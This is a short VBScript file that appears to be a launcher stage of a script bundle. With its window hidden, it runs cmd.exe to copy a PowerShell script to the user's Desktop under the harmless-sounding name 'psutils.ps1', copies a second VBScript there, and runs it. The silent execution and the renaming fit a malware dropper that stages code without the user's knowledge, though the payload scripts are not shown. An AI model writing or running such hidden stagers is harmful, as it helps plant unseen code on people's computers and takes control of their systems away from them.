Set objShell = CreateObject("WScript.Shell")
objShell.Run "CMD /C START /B " & objShell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\cmd.exe /C cd %cd% & copy folder\crow64.ps1 %USERPROFILE%\Desktop\psutils.ps1 & copy folder\windowzsized.vbs %USERPROFILE%\Desktop\windowzsized.vbs & %USERPROFILE%\Desktop\windowzsized.vbs", 0, False
Set objShell = Nothing
